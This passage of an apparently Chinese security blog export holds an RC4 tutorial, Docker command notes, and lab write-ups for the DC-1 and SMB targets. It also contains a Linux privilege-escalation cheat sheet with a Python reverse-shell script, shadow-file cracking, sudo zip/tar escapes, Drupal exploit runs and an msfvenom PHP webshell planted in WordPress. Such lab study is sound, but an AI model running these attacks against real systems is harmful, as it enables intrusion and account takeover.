相当于执行1024次，这样生成的密钥流也是1024个字节 i = (i+1)mod256; j = (j+S[i])mod256; swap(S[i],S[j]); t = (S[i]+S[j])mod256; k = S[t]; 这里的k就是当前生成的一个密钥流中的一位 // 可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或就ok data[] = data[]^k; // 进行加密，^是异或运算符 &emsp;&emsp;解密按照前面写的，异或两次就是原文，所以只要把密钥流重新拿过来异或一次就能得到原文了 三、完整算法实现1、C//程序开始#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned longULONG; /*初始化函数*/void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)&#123; int i = 0, j = 0; char k[256] = &#123; 0 &#125;; unsigned char tmp = 0; for (i = 0; i&lt;256; i++) &#123; s[i] = i; k[i] = key[i%Len]; &#125; for (i = 0; i&lt;256; i++) &#123; j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j];//交换s[i]和s[j] s[j] = tmp; &#125;&#125; /*加解密*/void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)&#123; int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k&lt;Len; k++) &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j];//交换s[x]和s[y] s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] ^= s[t]; &#125;&#125; int main()&#123; unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box char key[256] = &#123; &quot;justfortest&quot; &#125;; char pData[512] = &quot;这是一个用来加密的数据Data&quot;; unsigned long len = strlen(pData); int i; printf(&quot;pData=%s\\n&quot;, pData); printf(&quot;key=%s,length=%d\\n\\n&quot;, key, strlen(key)); rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化 printf(&quot;完成对S[i]的初始化，如下：\\n\\n&quot;); for (i = 0; i&lt;256; i++) &#123; printf(&quot;%02X&quot;, s[i]); if (i &amp;&amp; (i + 1) % 16 == 0)putchar(&#x27;\\n&#x27;); &#125; printf(&quot;\\n\\n&quot;); for (i = 0; i&lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！ &#123; s2[i] = s[i]; &#125; printf(&quot;已经初始化，现在加密:\\n\\n&quot;); rc4_crypt(s, (unsigned char*)pData, len);//加密 printf(&quot;pData=%s\\n\\n&quot;, pData); printf(&quot;已经加密，现在解密:\\n\\n&quot;); //rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥 rc4_crypt(s2, (unsigned char*)pData, len);//解密 printf(&quot;pData=%s\\n\\n&quot;, pData); return 0;&#125; //程序完 2、Python# rc4.pyimport base64def rc4_init_sbox(key): s_box = list(range(256)) # 没管秘钥小于256的情况，小于256不断重复填充即可 length = len(key) # print(&quot;原来的 s 盒：%s&quot; % s_box) T = [] for i in range(256): T.append(key[i % length]) j = 0 for i in range(256): j = (j + s_box[i] + ord(T[i])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] print(&quot;混乱后的 s 盒：%s&quot;% s_box) return s_boxdef rc4_encrypt(s_box, data): res = [] i = j = 0 length = len(data) for k in range(length): i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 s = s_box[t] res.append(chr(ord(data[k]) ^ s)) result = &quot;&quot;.join(res) print(&quot;RC4加密后的字符串是:%s&quot; % result) print(&quot;RC4加密后(Base64编码)的字c符串是:&quot; + str(base64.b64encode(result.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;)) return str(base64.b64encode(result.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;)def rc4_decrypt(s_box, data): data = base64.b64decode(data.encode(&#x27;utf-8&#x27;)) data = bytes.decode(data) res = [] i = j = 0 length = len(data) for k in range(length): i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 s = s_box[t] res.append(chr(ord(data[k]) ^ s)) result = &quot;&quot;.join(res) print(&quot;RC4解密后的字符串是:%s&quot; % result) return result# main.pyfrom rc4 import rc4_init_sbox, rc4_encrypt, rc4_decryptif __name__ == &quot;__main__&quot;: while True: function = input(&quot;E to encrypt or D to decrypt for rc4:&quot;) if function.upper() == &#x27;E&#x27;: data = input(&quot;请输入你要进行RC4加密的数据：&quot;) key = input(&quot;请输入RC4加密密钥：&quot;) s_box = rc4_init_sbox(key) rc4_encrypt(s_box, data) elif function.upper() == &#x27;D&#x27;: data = input(&quot;请输入你要进行RC4解密的数据：&quot;) key = input(&quot;请输入RC4解密密钥：&quot;) s_box = rc4_init_sbox(key) rc4_decrypt(s_box, data) else: print(&quot;请输入正确的功能&quot;) 参考链接： https://www.cnblogs.com/gambler/p/9075415.html https://www.cnblogs.com/block2016/p/5601925.html https://www.jianshu.com/p/d9ad5fc524ec","categories":[{"name":"密码学","slug":"密码学","permalink":"https://wolke.cn/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://wolke.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"author":"w01ke"},{"title":"Vulhub-DC-1-Drupal","slug":"Vulhub-DC-1-Drupal","date":"2021-12-10T13:17:58.000Z","updated":"2022-01-03T03:30:07.344Z","comments":true,"path":"post/58fcce74.html","link":"","permalink":"https://wolke.cn/post/58fcce74.html","excerpt":"","text":"一、靶机说明1、下载链接&emsp;&emsp;靶场镜像：链接: https://www.vulnhub.com/entry/dc-1-1,292/ 2、靶机准备（1）重置靶场密码&emsp;&emsp;重启主机，长按shift，进入如下界面后，按e &emsp;&emsp;找到linux开头的行，在最后输入 init=/bin/bash，输入完成后按Crtl+X &emsp;&emsp;mount -o rw,remount /，回车 &emsp;&emsp; passwd root，输入新密码两次 &emsp;&emsp;如果提示改变密码成功，重启该虚拟机 （2）查看IP&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入ip a，查看IP地址 二、预备知识&emsp;&emsp;Drupal：Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成。 &emsp;&emsp;注入原理：Drupal Sql注入漏洞原理是酱紫的，Drupal在处理IN语句的时候，要通过expandArguments函数来展开数组。由于expandArguments函数没有对当前数组中key值进行有效的过滤，给攻击者可乘之机。攻击者通过精心构造的SQL语句可以执行任意PHP代码。 三、信息收集1、探测主机IP&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover （1）arp-scan&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.108 arp-scan -l （2）netdiscover&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108 ip a &emsp;&emsp;使用netdiscover命令 netdiscover -r ip/子网掩码 命令来探测靶机 netdiscover -r 192.168.1.1/24 2、开放端口与服务扫描&emsp;&emsp;使用nmap对IP进行扫描： nmap -sV 192.168.1.108 &emsp;&emsp;可以看到开放了HTTP和SSH &emsp;&emsp;发现是Drupal的cms框架的登录页面 四、漏洞探测与利用1、漏洞探测&emsp;&emsp;首先弱口令登录，扫端口、扫后台都没什么较大的收获。于是将目标盯在了Drupal这个cms框架上面了，发现这个cms有一个注入getshell的漏洞（CVE-2018-7600），并且metasploit中已有攻击模块，可以直接利用。 &emsp;&emsp;打开msf，查找drupal武器库 msfconsolesearch drupal &emsp;&emsp;这里可以根据需求选择，我选择比较新的2018年的攻击模块 2、漏洞利用（1）反弹shelluse /exploit/unix/webapp/drupal_drupalgeddon2set RHOSTS 192.168.1.108 &emsp;&emsp;使用python反弹一个交互式shell TTY，美化终端 python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; （2）flag1&emsp;&emsp;查看当前目录，看有无可以利用的信息文件，其他目录信息如下。发现了第一个flag1文件，查看flag1文件。 （3）flag2&emsp;&emsp;通过flag1的提示，告知我们cms的配置文件很重要，暗藏敏感文件。所以我们需要查看目录下的其他文件来获取信息。 首先我们百度搜索drupal有哪些重要的配置文件及重要文件的默认路径 ，挑选重点下手能节省时间。 drupal的配置文件是 /sites/default/settings.php ，是数据库连接配置文件。我们去查看这个文件有大收获，我们发现了flag2内容，以及数据库的账户和密码 &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,&#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,&#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;, （4）数据库相关信息获取&emsp;&emsp;首先我们通过flag2得到了数据库为mysql数据库，并且数据库名、账号和密码都有了，肯定是要进入数据库看有无所需信息的。如系统管理员账户信息 mysql -udbuser -pR0ck3t &emsp;&emsp;Drupal框架默认的用户表就是users表，查询users表中，系统管理员admin的账户信息 show databases;use drupaldbshow tables;select * from users; $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR &emsp;&emsp;发现admin账号和经过加密的密码，drupal常用密码加密是MD5格式，但是7.0以后因为安全性问题将加密方式改成了hash加密（由于很多在线MD5爆破和MD5数据库，可以查到很多MD5码的原文，所以Drupal 7已不再采用Drupal 6和5简单的MD5加密，而是采用一种新型的Hash加密方法。新型加密方法是“加了盐（Salt）”的MD5码，简单理解就是并不会直接将password进行MD5加密，而会和用户名或其它随机字符串组合在一起后再MD5加密。）。 &emsp;&emsp;这里不是md5加密，应该是自定义的加密方式。flag2中给的提示暴力破解不是唯一的方法我们得想一下其他的办法。 （5）数据库admin管理员密码修改及获取flag3&emsp;&emsp;我们想办法的同时也可以百度向开发人员询问答案，查找drupal7忘记密码怎么办？drupal7如何重置密码？drupal7如何修改密码？这些问题让我们拿到admin这个管理员账户。 drupal7重置admin用户的密码 php scripts/password-hash.sh 123456 &emsp;&emsp;这样就能获取加密后的密码 &emsp;&emsp;进入数据库，修改admin的密码（密文） mysql -udbuser -pR0ck3tuse drupaldb;update users set pass=&quot;$S$DFrLnFFXTGFCqK75zqX7nXsNI271QDS5pDN7uIOgcguQK81Fj1LI&quot; where name=&quot;admin&quot;; 登录成功 （7）更隐蔽方式，添加新管理员账户获取flag3&emsp;&emsp;exploit-db（漏洞利用库）：kali中已经内置，默认路径为：/pentest/exploits/exploitdb。可以使用searchsploit命令来搜索exp进行利用。 &emsp;&emsp;在exploitdb中有一个针对Drupal 7版本的攻击脚本，可以增加一个admin权限的用户账号，第二种方法是通过该过程新增admin密码。 查看Drupal版本，确定Drupal版本为7.24 cat /var/www/includes/bootstrap.inc | grep VERSION 使用searchsploit查找可利用漏洞。选择添加管理员功能的攻击脚本适用于7.0-7.31范围（每个脚本括号后面有功能描述），符合7.24版本。 searchsploit drupal 利用drupal7.0版本漏洞增加有admin权限的用户 python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.43.62 -u w01ke -p w01ke后面靶机出了点问题，靶机ip换成了192.168.43.62 &emsp;&emsp;新增的管理员用户如下 &emsp;&emsp;使用新添加的用户w01ke登录网站，在content模块下找到flag3。 Congratulations！Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.恭喜你!特殊的PERMS可以帮助找到密码-但您需要-exec该命令，以确定如何获取在shadow文件中的内容很明显的提示：find+perms+exec 命令用来提权 五、提权&emsp;&emsp;根据flag3的提示提权，我们尝试查看用户列表信息（包含用户权限信息），这些用户信息一般存储在/etc/passwd目录下。 &emsp;&emsp;查看用户列表，获取信息 cat /etc/passwd &emsp;&emsp;发现了flag4这个用户，并且得到了flag4的主目录为home目录。我们切换到home目录寻找flag4相关文件 cd /home/flag4cat flag4.txt flag4提示内容:提示最后flag in root下面。 &emsp;&emsp;其实也可以直接用find命令查找flag4这个关键字，也能爆出flag4文件的路径。主要看个人思路 find / -name &quot;flag4cd /home/flag4cat flag4.txt &emsp;&emsp;根据flag4的提示信息，最后一个flag存在于root目录下。我们可以使用find命令查找root目录下相关文件信息。 使用find命令查看与/root目录有关的文件信息 find /rootfind命令是用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件，并将查找到的子目录和文件全部进行显示。find(选项)(参数)-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令-perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录 &emsp;&emsp;发现flag文件存在于/root目录下，尝试打开它，发现没有权限，所以必须要提权才能查看最终的flag文件 根据flag3中的提示，使用”-exec“提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用，看个人想法。详细关于find提权会在另一篇文章中详解 1. find ./ acce -exec &#x27;/bin/sh&#x27; \\;2. touch bccefind bcce -exec &#x27;/bin/sh&#x27; \\; &emsp;&emsp;成功访问最后一个flag文件，游戏结束了。 六、总结&emsp;&emsp;本次初级内网渗透靶场虽然初级，但也涉及了大量的知识点。 使用python反弹一个交互式shell 配置文件十分重要，重要的配置文件可以搜索相关系统或者框架的默认路径，能在较短时间内获取有用信息。如： drupal的/sites/default/settings.php ，是数据库连接配置文件 exploit-db（漏洞利用库）真的很强大，里面很多攻击脚本。不知道为什么以前很少用，现在要加强对他的了解了。他就是metspoit的兄弟 /etc/passwd：linux默认存储用户列表的文件 linux suid提权相关知识，在后面的文章中再详细了解。 参考链接：https://www.cnblogs.com/kbhome/p/13296397.html","categories":[{"name":"综合靶场","slug":"综合靶场","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"提权","slug":"提权","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"Drupal","slug":"Drupal","permalink":"https://wolke.cn/tags/Drupal/"}],"author":"w01ke"},{"title":"Linux提权的各种姿势","slug":"Linux提权的各种姿势","date":"2021-12-09T15:45:17.000Z","updated":"2023-02-20T02:43:19.942Z","comments":true,"path":"post/927dc08e.html","link":"","permalink":"https://wolke.cn/post/927dc08e.html","excerpt":"","text":"一、提权介绍&emsp;&emsp;往往我们能拿下服务器的web服务只是具有低权限用户(www-data)，对于内网渗透，我们需要提权到root。Linux系统的提权过程不止涉及到了漏洞，也涉及了很多系统配置。 提权前提: 已经拿到低权shell 被入侵的机器上面有nc，python，perl等linux非常常见的工具 有权限上传文件和下载文件 二、内核漏洞提权&emsp;&emsp;内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集 查看发行版本： cat /etc/issuecat /etc/*-releaselsb_release -acat /etc/lsb-releasecat /etc/redhat-releasedmesg | grep Linuxls /boot | grep vmlinuz 查看内核版本： uname -acat /proc/versionuname -mrsrpm -q kernel 找到系统版本号，通过kali的searchsploit查找该版本是否存在漏洞 发现不存在内核溢出代码 假若存在内核溢出代码，可通过如下命令，上传内核溢出代码，编译执行 gcc xxx.c -o exploit [-lpthread]chmod +x exploit./exploit 三、明文root提权-通过passwd和shadow破译密码&emsp;&emsp;大多linux系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。 &emsp;&emsp;例如破解linux用户名和对应的密码 /etc/passwd /etc/shadowunshadow passwd shadow &gt; crackedjohn cracked 四、计划任务&emsp;&emsp;系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出 &emsp;&emsp;使用命令：cat /etc/crontab 回车查看计划任务 &emsp;&emsp; 默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写的管理员，我们就可以修改脚本等回连root shell；如果定时执行的文件是py脚本，可以使用以下的脚本来替换之前的脚本： #!/usr/bin/pythonimport os,subprocess,sockets=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;攻击机IP地址&quot;,&quot;攻击机监听端口&quot;))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]) &emsp;&emsp;攻击机启动nc监听端口：nc -nlvp port 五、密码复用&emsp;&emsp;很多管理员会重复使用密码，因此数据库或者web后台的密码也许就是root密码。 &emsp;&emsp;有了（疑似)） root密码怎么办？你一定想ssh登陆。然而ssh很可能禁止root登陆，或是防火墙规则将你排除在外了。返回来想，我们不是有一个低权shell了吗？找个办法在上面“输入”密码就好了。显然，直接在低权shell里面用sudo是不奏效的。这是因为出于安全考虑linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入(stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。python就有这样的功能。在shell里面输入： python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27; 六、zip、rar提权sudo –l 发现可以使用root执行zip和tar命令 &emsp;&emsp;利用zip进行提权 touch exploit 新建exploit文件sudo -u root zip exploit.zip exploit -T -unzip -command=&quot;sh -c /bin/bash&quot; &emsp;&emsp;利用tar进行提权 sudo -u root tar cf /dev/null exploit -checkpoint=1 --checkpoint -action=&quot;/bin/bash&quot;","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://wolke.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"内网安全","slug":"内网安全","permalink":"https://wolke.cn/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"SMB信息泄露","slug":"SMB信息泄露","date":"2021-12-09T13:25:49.000Z","updated":"2022-01-03T03:29:39.556Z","comments":true,"path":"post/6e6874d7.html","link":"","permalink":"https://wolke.cn/post/6e6874d7.html","excerpt":"","text":"一、靶机说明1、下载链接&emsp;&emsp;靶场镜像：链接: https://pan.baidu.com/s/1xfKILyIzELi_ZgUw4aXT7w 提取码: 59g0 2、靶机准备（1）重置靶场密码&emsp;&emsp;重启主机，疯狂按shift，进入如下界面后，按e &emsp;&emsp;找到linux开头的行，在最后输入 init=/bin/bash，输入完成后按Crtl+X &emsp;&emsp;mount -o rw,remount /，回车 &emsp;&emsp;passwd root，输入新密码两次 &emsp;&emsp;如果提示改变密码成功，重启该虚拟机 （2）查看IP&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入ip a，查看IP地址 二、信息收集1、探测主机IP&emsp;&emsp;可以使用arp-scan或者netdiscover （1）arp-scan&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107 arp-scan -l （2）netdiscovernetdiscover -r 192.168.1.1/24 2、开放端口与服务扫描&emsp;&emsp;使用nmap对IP进行扫描： nmap -sV 192.168.1.107 &emsp;&emsp;可以看到开放了SMB、Mysql、SSH服务 三、漏洞探测与利用1、针对SMB协议弱点检测&emsp;&emsp;因为这节主要针对的是smb协议，所以对其进行一波探测&emsp;&emsp;首先，使用空口令: smbclient -L IP，列出该ip所分享的文件和链接。 Print 是 共享驱动 ， 就是共享打印机 Share 是共享文件夹IPC$ 是共享空连接，不需要用户名就能登陆的web服务器 &emsp;&emsp;查看print里面的东西（没有权限） smbclient &#x27;\\\\IP\\print$&#x27; &emsp;&emsp;查看share共享文件夹里的东西 smbclient &#x27;\\\\IP\\share$&#x27; &emsp;&emsp;get+文件名，可以下载获得文件信息 &emsp;&emsp;打开新的终端，打开文件：发现写着密码为12345 &emsp;&emsp;相同的方法下载todolist.txt下来看看 &emsp;&emsp;接下来打开wordpress看看，主要看配置文件 &emsp;&emsp;可以从前面看到该服务器开放了mysql 3306端口，尝试直接连接数据库，但是失败了，应该是设置了只能从本地连接 mysql -h 192.168.1.107 -uroot -pTogieMYSQL12345^^ &emsp;&emsp;因为开放了22端口，尝试使用ssh协议远程登录，但显示密码不对 ssh Admin@192.168.1.107 &emsp;&emsp;针对smb协议，查看是否存在远程溢出漏洞进行分析 searchsploit samba版本号 &emsp;&emsp;没有任何漏洞可以利用 2、针对HTTP协议弱点探测（1）目录扫描&emsp;&emsp;发现wrodpress的wp-login.php dirsearch -u http://192.168.1.107 &emsp;&emsp;打开网页看看 &emsp;&emsp;输入前面的wp-config.php中的账号和密码，成功进入 （2）构造payload获取shell&emsp;&emsp;使用msfvenom构造payload msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=4444 -f raw &gt; shell.php &emsp;&emsp;打开msfconsole，开启监听 （3）在wordpress中上传webshell&emsp;&emsp;将shell.php的内容粘贴到 wordpress中的Appearance中，Editor中的404页面 &emsp;&emsp;点击update file &emsp;&emsp;接下来访问404页面：http://192.168.1.107/wordpress/wp-content/themes/twentyfifteen/404.php（注意这里的**twentyfifiteen**要按照图中自己的实际情况修改） &emsp;&emsp;查看监听端，成功反弹shell （4）优化终端&emsp;&emsp;调用交互式命令行，优化终端 python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; （5）获得flag&emsp;&emsp;使用cat /etc/passwd命令，来查看每个用户账号的属性。 &emsp;&emsp;可以看到里面有一个熟悉的，在wordpress页面中出现了很多次的用户togie，切换到其账户： su togie &emsp;&emsp;密码是之前deets.txt中写的12345，成功进入 &emsp;&emsp;使用sudo -i命令进入root模式，密码同样是12345 &emsp;&emsp;进入root目录，可以看到proof.txt文件。","categories":[{"name":"综合靶场","slug":"综合靶场","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"SMB","slug":"SMB","permalink":"https://wolke.cn/tags/SMB/"}],"author":"w01ke"},{"title":"docker常用命令","slug":"docker常用命令","date":"2021-12-09T04:15:35.000Z","updated":"2022-01-03T03:26:03.965Z","comments":true,"path":"post/749ad7d8.html","link":"","permalink":"https://wolke.cn/post/749ad7d8.html","excerpt":"","text":"一、帮助命令docker version #查看docker版本（有client和server，看到server起来了才说明docker起来了）docker info #显示docker的系统信息，包括镜像和容器的数量docker 命令 --help #万能命令 &emsp;&emsp;帮助文档的地址：https://docs.docker.com/reference/ 二、镜像命令1、查看镜像&emsp;&emsp;docker images 列出本地镜像 &emsp;&emsp;语法：docker images [OPTIONS] [REPOSITORY[:TAG]] &emsp;&emsp;OPTIONS说明： -a，–all 列出本地所有的镜像（含中间映像层，默认情况下，隐藏中间映像层） –digests 显示镜像的摘要信息（签名） -f，–fliter 根据条件对输出结果进行过滤 –format 格式化输出结果 –no-trunc 不截断输出，即显示完整的镜像ID信息 -q 只显示镜像ID #列出最近创建的镜像[root@VM-0-15-centos ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZEmysql latest 5a4e492065c7 11 days ago 514MBhello-world latest d1165f221234 5 months ago 13.3kBcentos latest 300e315adb2f 8 months ago 209MB80x86/typecho latest 3437f7346b4c 2 years ago 53.9MB#列出指定镜像名hello-world:latest的信息[root@VM-0-15-centos ~]# docker images hello-world:latestREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest d1165f221234 5 months ago 13.3kB#列出镜像名为hello-world的所有镜像信息[root@VM-0-15-centos ~]# docker images hello-worldREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest d1165f221234 5 months ago 13.3kB#也可以使用模糊查找的方式：[root@VM-0-15-centos ~]# docker images hello-worldREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest d1165f221234 5 months ago 13.3kB#显示镜像完整的ID[root@VM-0-15-centos ~]# docker images --no-truncREPOSITORY TAG IMAGE ID CREATED SIZEmysql latest sha256:5a4e492065c722ec8cc7413552bafc6fd5434c5ad90797e898ccc4e347e21aa5 11 days ago 514MBhello-world latest sha256:d1165f2212346b2bab48cb01c1e39ee8ad1be46b87873d9ca7a4e434980a7726 5 months ago 13.3kBcentos latest sha256:300e315adb2f96afe5f0b2780b87f28ae95231fe3bdd1e16b9ba606307728f55 8 months ago 209MB80x86/typecho latest sha256:3437f7346b4c58c7451ff6e398f9b8e4019a7a34186af61aba54d0f00a71a398 2 years ago 53.9MB#显示镜像的摘要（签名）[root@VM-0-15-centos ~]# docker images --digestsREPOSITORY TAG DIGEST IMAGE ID CREATED SIZEmysql latest sha256:d45561a65aba6edac77be36e0a53f0c1fba67b951cb728348522b671ad63f926 5a4e492065c7 11 days ago 514MBhello-world latest sha256:7d91b69e04a9029b99f3585aaaccae2baa80bcf318f4a5d2165a9898cd2dc0a1 d1165f221234 5 months ago 13.3kBcentos latest sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1 300e315adb2f 8 months ago 209MB80x86/typecho latest sha256:4af25c76919efa862d59aeb3a2d9f2394ad3ef4b338037e8a2499c55011dbbf7 3437f7346b4c 2 years ago 53.9MB#筛选在hello-world:latest镜像之前创建的镜像[root@VM-0-15-centos ~]# docker images -f &quot;before=hello-world:latest&quot;REPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 300e315adb2f 8 months ago 209MB80x86/typecho latest 3437f7346b4c 2 years ago 53.9MB#筛选在hello-world:latest镜像之后创建的镜像[root@VM-0-15-centos ~]# docker images -f &quot;since=hello-world:latest&quot;REPOSITORY TAG IMAGE ID CREATED SIZEmysql latest 5a4e492065c7 11 days ago 514MB#列出虚悬镜像[root@VM-0-15-centos ~]# docker images -f &quot;dangling=true&quot;REPOSITORY TAG IMAGE ID CREATED SIZE#显示镜像ID和镜像名[root@VM-0-15-centos ~]# docker images --format &quot;&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;&quot;5a4e492065c7: mysqld1165f221234: hello-world300e315adb2f: centos3437f7346b4c: 80x86/typecho#以表格的形式显示镜像ID、镜像名和镜像标签[root@VM-0-15-centos ~]# docker images --format &quot;table &#123;&#123;.ID&#125;&#125;\\t&#123;&#123;.Repository&#125;&#125;\\t&#123;&#123;.Tag&#125;&#125;&quot;IMAGE ID REPOSITORY TAG5a4e492065c7 mysql latestd1165f221234 hello-world latest300e315adb2f centos latest3437f7346b4c 80x86/typecho latest#解释REPOSITORY 镜像的仓库源TAG 镜像的标签IMAGE ID 镜像的idCREATED 镜像的创建时间SIZE 镜像的大小 2、搜索镜像&emsp;&emsp;docker search 搜索镜像 &emsp;&emsp;语法：docker search [OPTIONS] TERM &emsp;&emsp;OPTIONS说明： –automated 只列出 automated build类型的镜像 -f，–filter 列出收藏数不小于指定值的镜像 –no-trunc 不截断输出，即显示完整的镜像ID信息 [root@VM-0-15-centos ~]# docker search mysqlNAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relation… 11332 [OK]mariadb MariaDB Server is a high performing open sou… 4307 [OK]mysql/mysql-server Optimized MySQL Server Docker images. Create… 840 [OK]phpmyadmin phpMyAdmin - A web interface for MySQL and M… 305 [OK]#从 Docker Hub 查找所有镜像名包含mysql，并且收藏数大于等于 3000 的镜像[root@VM-0-15-centos ~]# docker search mysql -f stars=3000NAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relation… 11334 [OK]mariadb MariaDB Server is a high performing open sou… 4307 [OK]#参数说明NAME #镜像仓库源的名称DESCRIPTION #镜像的描述OFFICIAL #是否 docker 官方发布STARS #类似 Github 里面的 star，表示点赞、喜欢的意思。AUTOMATED #自动构建 3、下载镜像&emsp;&emsp;docker pull 下载镜像 &emsp;&emsp;语法：docker pull [OPTIONS] NAME[:TAG|@DIGEST] &emsp;&emsp;OPTIONS说明： -a 拉取所有 tagged 镜像 –disable-content-trust 忽略镜像的校验,默认开启 下载镜像 docker pull 镜像名[:tag][root@VM-0-15-centos ~]# docker pull mysqlUsing default tag: latest #如果不写tag，默认就是latestlatest: Pulling from library/mysqle1acddbe380c: Pull complete #分层下载，docker image的核心 联合文件系统bed879327370: Pull complete03285f80bafd: Pull completeccc17412a00a: Pull complete1f556ecc09d1: Pull completeadc5528e468d: Pull complete1afc286d5d53: Pull complete6c724a59adff: Pull complete0f2345f8b0a3: Pull completec8461a25b23b: Pull complete3adb49279bed: Pull complete77f22cd6c363: Pull completeDigest: sha256:d45561a65aba6edac77be36e0a53f0c1fba67b951cb728348522b671ad63f926 #签名Status: Downloaded newer image for mysql:latestdocker.io/library/mysql:latest #真实地址#等价关系docker pull mysqldocker pull docker.io/library/mysql:latest#指定版本下载[root@VM-0-15-centos ~]# docker pull mysql:5.75.7: Pulling from library/mysqle1acddbe380c: Already existsbed879327370: Already exists03285f80bafd: Already existsccc17412a00a: Already exists1f556ecc09d1: Already existsadc5528e468d: Already exists1afc286d5d53: Already exists4d2d9261e3ad: Pull completeac609d7b31f8: Pull complete53ee1339bc3a: Pull completeb0c0a831a707: Pull completeDigest: sha256:7cf2e7d7ff876f93c8601406a5aa17484e6623875e64e7acc71432ad8e0a3d7eStatus: Downloaded newer image for mysql:5.7docker.io/library/mysql:5.7#下载REPOSITORY为mysql的所有镜像docker pull -a mysql 4、删除镜像&emsp;&emsp;docker rmi 删除本地一个或多个镜像 &emsp;&emsp;语法：docker rmi [OPTIONS] IMAGE [IMAGE...] &emsp;&emsp;OPTIONS说明： -f 强制删除 –no-prune 不移除该镜像的过程镜像，默认移除 [root@VM-0-15-centos ~]# docker rmi -f 镜像id #强制删除指定的镜像[root@VM-0-15-centos ~]# docker rmi -f 镜像id 镜像id 镜像id #强制删除多个指定的镜像[root@VM-0-15-centos ~]# docker rmi -f $(docker images -aq) #强制删除所有的镜像 三、容器命令说明：我们有了镜像才可以创建容器，Linux系统下下载一个CentOS镜像来测试学习 &emsp;&emsp;docker pull centos 